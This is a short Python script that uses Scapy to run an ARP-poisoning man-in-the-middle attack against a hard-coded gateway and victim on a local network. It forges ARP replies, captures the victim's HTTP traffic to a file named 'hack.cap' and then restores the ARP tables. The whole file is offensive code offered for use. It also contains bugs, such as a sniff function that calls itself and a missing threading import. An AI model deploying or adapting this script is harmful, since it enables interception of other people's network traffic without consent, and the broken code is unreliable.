from scapy.all import *
import os
import sys
import time


gateway  = "10.0.0.138"
ip = "10.0.0.149"
count = int(input("Enter how many packets you want to sniff: "))


def get_mac(ipaddr):
  resp , unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipaddr),timeout=2)
  for l, m in resp:
    return m[Ether].src


gate_mac = get_mac(gateway)
gate_ip = get_mac(ip)

if gate_mac != None:
  print(f"MAC address: {gate_mac} was found")

else:
  sys.exit("Hack was not sucessfull")

if gate_ip != None:
  print(f"MAC address: {gate_ip} was found")

else:
  sys.exit("Hack was not sucessfull")

def poison(gateway, gate_mac, gate_ip, ip):
  while True:
    send(ARP(op = 2, psrc = gateway, pdst= ip, hwdst = gate_ip))
    send(ARP(op = 2, psrc = ip, pdst= gateway, hwdst = gate_mac))


def restore(gateway, gate_mac, gate_ip, ip):
  print("Trying to restore")
  send(ARP(op = 2, psrc = gateway, pdst= ip, hwdst = "ff:ff:ff:ff:ff:ff" , hwsrc = gate_mac), count = 5)
  send(ARP(op = 2, psrc = ip, pdst= gateway, hwdst = "ff:ff:ff:ff:ff:ff",  hwsrc = gate_ip))




def sniff():
  pkts = sniff(count = count, filter = f"host {ip} and tcp port 80", iface = "Intel(R) Wi-Fi 6 AX200 160MHz")
  print(f"sniffing {count} packets on IP: {ip}")
  wrpcap("hack.cap", pkts)
  restore(gateway, gate_mac, gate_ip, ip)
  sys.exit("ARP poisoning was ran succesfully")

t1 = threading.Thread(target=poison, args= (gateway, gate_mac, gate_ip, ip))


t2 = threading.Thread(target=sniff, args= (gateway, gate_mac, gate_ip, ip))

t1.start()

time.sleep(1)

t2.start()









